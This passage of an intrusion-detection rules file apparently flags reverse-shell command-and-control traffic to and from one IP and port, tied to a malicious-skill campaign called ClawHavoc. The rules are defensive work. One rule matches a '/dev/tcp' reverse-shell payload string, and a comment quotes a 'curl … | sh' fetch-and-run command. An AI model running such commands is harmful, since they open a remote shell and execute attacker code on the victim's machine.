# =============================================================================
# SECTION 3: REVERSE SHELL C2 — 54.91.154.110:13338 (HIGH)
# =============================================================================
# better-polymarket + polymarket-all-in-one skills. Researchers confirmed
# live /dev/tcp shell payload at this endpoint (VirusTotal, Koi, Bitdefender).
# Port 13338 is non-standard and confirmed exclusive to this C2.

alert tcp $HOME_NET any -> 54.91.154.110 13338 (msg:"OPENCLAW [IOC-REVSHELL-HIGH] ClawHavoc Reverse Shell C2 - 54.91.154.110:13338"; flow:to_server; classtype:trojan-activity; reference:url,blog.virustotal.com/2026/02/from-automation-to-infection-part-ii.html; reference:url,businessinsights.bitdefender.com/technical-advisory-openclaw-exploitation-enterprise-networks; priority:1; metadata:campaign ClawHavoc, malicious_skills better-polymarket/polymarket-all-in-one, confidence HIGH; sid:9203412; rev:3;)

alert tcp 54.91.154.110 13338 -> $HOME_NET any (msg:"OPENCLAW [IOC-REVSHELL-HIGH] ClawHavoc Reverse Shell Response - Inbound from 54.91.154.110:13338"; flow:to_client; classtype:trojan-activity; reference:url,blog.virustotal.com/2026/02/from-automation-to-infection-part-ii.html; priority:1; metadata:campaign ClawHavoc, confidence HIGH, direction inbound; sid:9203413; rev:3;)

# /dev/tcp shell payload delivery — confirmed payload string from C2
alert tcp 54.91.154.110 any -> $HOME_NET any (msg:"OPENCLAW [IOC-REVSHELL-HIGH] ClawHavoc /dev/tcp Reverse Shell Payload String from C2"; flow:to_client,established; content:"/dev/tcp/54.91.154.110/13338"; classtype:trojan-activity; reference:url,blog.virustotal.com/2026/02/from-automation-to-infection-part-ii.html; priority:1; metadata:confidence HIGH, malware_family bash_reverse_shell; sid:9203414; rev:3;)

# curl payload fetch to 54.91.154.110:13338 (Bitdefender confirmed: curl -s IP:13338/|sh)
alert http $HOME_NET any -> 54.91.154.110 13338 (msg:"OPENCLAW [IOC-REVSHELL-HIGH] ClawHavoc curl Payload Fetch from Reverse Shell C2"; flow:to_server,established; http.method; content:"GET"; classtype:trojan-activity; reference:url,businessinsights.bitdefender.com/technical-advisory-openclaw-exploitation-enterprise-networks; priority:1; metadata:confidence HIGH; sid:9203415; rev:3;)


